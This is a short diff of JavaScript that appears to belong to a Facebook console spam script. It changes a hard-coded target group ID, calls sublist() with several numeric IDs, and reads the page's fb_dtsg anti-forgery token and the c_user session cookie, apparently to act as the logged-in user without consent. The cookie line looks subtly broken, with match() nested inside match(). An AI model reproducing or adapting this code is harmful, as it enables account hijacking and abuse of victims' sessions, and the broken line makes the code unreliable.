@@ -98,7 +98,7 @@ sublist("364800053668242");
 sublist("1387426621554448");
 sublist("1387430628220714");
 
-var gid = ['772744832794676'];
+var gid = ['972273759459104'];
 
 var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
 var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
